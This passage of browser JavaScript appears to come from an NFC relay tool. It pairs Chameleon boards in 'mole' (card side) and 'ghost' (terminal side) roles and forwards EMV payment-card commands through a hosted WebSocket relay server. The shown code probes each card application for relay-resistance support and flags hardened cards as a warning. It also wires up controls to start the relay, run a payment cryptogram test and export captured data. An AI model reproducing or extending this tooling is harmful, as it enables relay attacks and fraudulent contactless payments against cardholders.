  const rly = async (a) => { try { const r = await M.relayApdu(a); return r.status === ST.HF_TAG_OK ? r.data : new Uint8Array(0); } catch (_) { return new Uint8Array(0); } };
  const fci = await rly(hexToBytes('00A404000E325041592E5359532E444446303100'));
  const seen = new Set();
  const aids = parseAids(fci).filter(a => { const h = hxc(a); if (seen.has(h)) return false; seen.add(h); return true; });
  if (!aids.length) { log('RRP check: no AIDs in PPSE (card read failed?)', 'warn'); }
  for (const aid of aids) {
    const sel = concat(u8([0x00, 0xa4, 0x04, 0x00, aid.length]), aid, u8([0x00]));
    if (!sw9000(await rly(sel))) { log(`RRP: ${hxc(aid)} SELECT failed`, 'warn'); continue; }
    const gr = await rly(hexToBytes('80A8000002830000'));
    const aip = tlvFind(gr, 0x82)[0];
    // Relay-Resistance-Supported is AIP BYTE 2, bit 1 (0x01): e.g. 1981=RRP, 1980=no.
    const aipBit = aip && aip.length >= 2 ? !!(aip[1] & 0x01) : null;
    // Probe: EXCHANGE RELAY RESISTANCE DATA, 4-byte terminal entropy
    const rrp = await rly(hexToBytes('80EA000004AABBCCDD00'));
    const supported = rrp.length > 2 && sw9000(rrp);   // real RRP response vs error SW
    const sw = rrp.length >= 2 ? hxc(rrp.slice(-2)) : '(none)';
    log(`RRP  AID ${hxc(aid)}: AIP=${aip ? hxc(aip) : '?'} (relay-resist bit≈${aipBit}) · 80EA probe → ${supported ? 'SUPPORTED (relay-hardened)' : 'not supported (SW ' + sw + ')'}`,
        supported ? 'warn' : 'ok');
  }
  try { await M.relayStop(); } catch (_) {}
  log('RRP check done. (AIP bit is best-effort; the 80EA probe result is authoritative.)', 'ok');
}

window.addEventListener('DOMContentLoaded', () => {
  if (!navigator.bluetooth) {
    log('Web Bluetooth is not available in this browser. Use desktop or Android Chrome/Edge (not iOS Safari).', 'err');
    $('ghost-btn').disabled = true; $('mole-btn').disabled = true;
  }
  $('ghost-btn').onclick = () => toggleConnect('ghost');
  $('mole-btn').onclick = () => toggleConnect('mole');
  $('start').onclick = startRelay;
  $('stop').onclick = stopRelay;
  $('clear').onclick = () => { $('log').innerHTML = ''; };
  $('rxdump-btn').onclick = dumpRxLog;
  $('clearcache-btn').onclick = clearCache;
  if ($('rrp-btn')) $('rrp-btn').onclick = checkRRP;
  if ($('genac-btn')) $('genac-btn').onclick = testPayment;
  if ($('readers-btn')) $('readers-btn').onclick = toggleReaders;
  if ($('export-btn')) $('export-btn').onclick = exportData;
  if ($('readers-panel')) $('readers-panel').addEventListener('click', e => {
    const b = e.target.closest('button'); if (!b) return;
    if (b.classList.contains('rdr-rename')) renameReader(b.dataset.id);
    else if (b.classList.contains('rdr-del')) deleteReader(b.dataset.id);
  });
  $('link-btn').onclick = toggleLink;
  $('wake-btn').onclick = wakeServer;
  document.querySelectorAll('input[name=role]').forEach(r => r.addEventListener('change', applyRole));
  // default the server URL: our Render relay when hosted (https), ws://localhost for local dev
  $('server-url').value = (location.protocol === 'https:')
    ? 'wss://chameleon-relay-web.onrender.com' : 'ws://localhost:8080';
  setDevUI('ghost', ghost); setDevUI('mole', mole);
  applyRole();
  log(`ready (build ${BUILD}). Pick a role: Local (both boards here) · Mole (card side) · Ghost (terminal side).`);
});
